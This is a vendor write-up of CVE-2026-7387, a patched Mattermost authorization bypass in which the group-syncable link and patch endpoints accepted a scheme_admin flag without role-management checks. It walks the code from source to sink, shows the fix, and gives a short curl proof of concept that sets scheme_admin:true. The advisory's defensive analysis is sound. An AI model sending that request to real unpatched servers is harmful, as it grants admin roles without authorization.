---
schema_version: "1.0.0"
document_id: "1fcd3ff1da95e63b7bc947ef4ea3ce3e1c39b04585161257e4e8a6a458921e90"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-7387"
published_at: "2026-05-13T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T22:13:17.137376+00:00"
content_hash: "sha256:282d403b46f70ef86ff85c898eddbd155962dd4c9f7571108a5182f75957e60b"
---

# Group syncable scheme_admin authorization bypass (CVE-2026-7387)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


Mattermost


High


CVE-2026-7387


2026-05-13


# Group syncable scheme_admin authorization bypass (CVE-2026-7387)


## Summary


Group-syncable link and patch endpoints accepted role-granting scheme_admin changes under weaker link permissions


Mattermost group syncables let LDAP groups be linked to teams or channels and can optionally mark synchronized group members as scheme admins. Before the fix,` linkGroupSyncable()` and` patchGroupSyncable()` decoded` scheme_admin` as ordinary patch data, checked only the permissions needed to link or patch the group syncable, and then persisted the flag. The background sync path later trusted that stored bit and updated team or channel member role state.


The public advisory[MMSA-2026-00665](https://mattermost.com/security-updates) /[CVE-2026-7387](https://github.com/advisories/GHSA-6hxm-w4hv-vgvw) describes this as a High CWE-863 issue affecting Mattermost` 11.6.x <= 11.6.1` ,` 11.5.x <= 11.5.4` , and` 10.11.x <= 10.11.16` , with fixed versions` 11.7.0` ,` 11.6.2` ,` 11.5.5` ,` 10.11.16` , and` 10.11.17` . The original fix is PR #36316 / commit` 8c72083414e675c97987374395e36d1f36b4bd8a` ; release-line backports include #36431, #36432, and #36434.


### CVSS Score


Vector


N


Complexity


L


Privileges


L


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 354


server /channels


/api4


/group.go


linkGroupSyncable()


Sink


Line 1617


server /channels


/store


/sqlstore


/team_store.go


UpdateMembersRole()


## Source-to-Sink Analysis


1


server/channels/api4/group.go:354-358


The link endpoint decodes the request body into` GroupSyncablePatch` . A caller can include` scheme_admin` in the same JSON body used for ordinary syncable settings such as` auto_add` .


GO


```text
var   patch *model.GroupSyncablePatch
err = json.Unmarshal(body, &patch)
if   err !=  nil   {
c.SetInvalidParamWithErr( "group_syncable"  , err)
return
}


```


2


server/public/model/group_syncable.go:167-169


The model patch helper copied` SchemeAdmin` directly into the syncable object. It had no authorization context, so it could not distinguish harmless configuration changes from role-granting changes.


GO


```text
if   patch.SchemeAdmin !=  nil   {
syncable.SchemeAdmin = *patch.SchemeAdmin
}


```


3


server/channels/api4/group.go:372-381 (before fix)


Before PR #36316, the API persisted the patched object after the weaker link permission checks. The same missing role-management gate existed in the patch endpoint.


GO


```text
groupSyncable := &model.GroupSyncable{
GroupId:    c.Params.GroupId,
SyncableId: syncableID,
Type:       syncableType,
}
groupSyncable.Patch(patch)
groupSyncable, appErr = c.App.UpsertGroupSyncable(groupSyncable)


```


4


server/channels/api4/group.go:387-389 (before fix)


Persisting the syncable triggered asynchronous role and membership synchronization. A caller-controlled` SchemeAdmin` bit therefore flowed from the request body into background role changes.


GO


```text
c.App.Srv().Go( func  ()    {
c.App.SyncRolesAndMembership(c.AppContext, syncableID, syncableType, c.Params.GroupId)
})


```


5


server/channels/store/sqlstore/group_store.go:1832-1836


The sync path asks the store for group members whose linked syncable has` SchemeAdmin = TRUE` . That turns the persisted client-controlled field into the list of users who should become admins.


GO


```text
builder := s.getQueryBuilder().Select( "UserId"  ).
From(fmt.Sprintf( "Group%ss"  , syncableType)).
Join(fmt.Sprintf( "GroupMembers ON GroupMembers.GroupId = Group%ss.GroupId AND Group%[1]ss.SchemeAdmin = TRUE AND GroupMembers.DeleteAt = 0"  , syncableType.String()))


```


6


server/channels/store/sqlstore/team_store.go:1617-1625


The selected user IDs are written into team membership state as scheme admins. The channel path uses the same pattern for channel members.


GO


```text
func    (s SqlTeamStore)    UpdateMembersRole(teamID  string  , userIDs [] string  ) ([]*model.TeamMember,  error  ) {
query := s.getQueryBuilder().
Update( "TeamMembers"  ).
Set( "SchemeAdmin"  , sq.Case().When(sq.Eq{ "UserId"  : userIDs},  "true"  ).Else( "false"  ))
}


```


7


server/channels/api4/group.go:739-766 (fix, commit 8c72083)


The fix gates any explicit` SchemeAdmin` value on the same role-management permissions used by direct role assignment, or on the sysconsole groups-management permission.


GO


```text
func    verifySchemeAdminAssignmentPermission  (c *Context, syncableType model.GroupSyncableType, syncableID  string  , patch *model.GroupSyncablePatch)    *model.AppError {
if   patch ==  nil   || patch.SchemeAdmin ==  nil   {
return    nil
}


if   c.App.SessionHasPermissionTo(*c.AppContext.Session(), model.PermissionSysconsoleWriteUserManagementGroups) {
return    nil
}


switch   syncableType {
case   model.GroupSyncableTypeTeam:
if   !c.App.SessionHasPermissionToTeam(*c.AppContext.Session(), syncableID, model.PermissionManageTeamRoles) {
return   model.MakePermissionError(c.AppContext.Session(), []*model.Permission{model.PermissionManageTeamRoles})
}
case   model.GroupSyncableTypeChannel:
if   ok, _ := c.App.SessionHasPermissionToChannel(c.AppContext, *c.AppContext.Session(), syncableID, model.PermissionManageChannelRoles); !ok {
return   model.MakePermissionError(c.AppContext.Session(), []*model.Permission{model.PermissionManageChannelRoles})
}
}


return    nil
}


```


## Impact Analysis


### Critical Impact


The vulnerability bypasses Mattermost's intended role-management authorization boundary. A caller who should only manage group-sync configuration can cause synchronized group members to become team or channel admins, potentially granting membership management, settings changes, and other administrative abilities in the affected scope.


### Attack Surface


Mattermost deployments with LDAP groups enabled/licensed where a caller can link or patch group syncables for a team or channel. The affected API surface includes group syncable link and patch routes for teams and channels.


### Preconditions


The attacker must be authenticated, know or obtain a referenceable group ID and target team/channel ID, and have the weaker group-link or group-syncable management permissions for that target, but not the stronger role-management permission that direct admin-role assignment requires.


## Proof of Concept


### Environment Setup


Use a vulnerable Mattermost build before PR #36316 with LDAP groups enabled/licensed. Prepare one referenceable LDAP group and an authenticated user who can reach the group-syncable link or patch endpoint for the target team or channel but lacks direct role-management permission.


### Target Configuration


Set` MM_URL` ,` SESSION` ,` GROUP_ID` ,` TEAM_ID` , and` USER_ID` for the target instance. For a channel-scoped test, use the channel syncable endpoint and inspect the corresponding channel member record.


### Exploit Delivery


Create or update a group syncable while setting` scheme_admin` :


BASH


```text
curl -sS -X POST  " $MM_URL  /api/v4/groups/ $GROUP_ID  /teams/ $TEAM_ID  /link"   \
-H  "Cookie:  $SESSION  "   \
-H  'Content-Type: application/json'   \
--data  '{"auto_add":true,"scheme_admin":true}'


sleep   3
curl -sS  " $MM_URL  /api/v4/teams/ $TEAM_ID  /members/ $USER_ID  "   \
-H  "Cookie:  $SESSION  "   | jq  '.scheme_admin, .roles'


```


### Outcome


The attacker can convert group-sync configuration access into team or channel admin role assignment on vulnerable builds. PR #36316 restores the stronger authorization boundary.


**Expected Response:** Vulnerable builds accept the request and, after synchronization, show` scheme_admin: true` or equivalent admin role state for synchronized members. Fixed builds reject explicit` scheme_admin` changes unless the caller has the required role-management permission.


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/mattermost/mattermost/pull/36316)
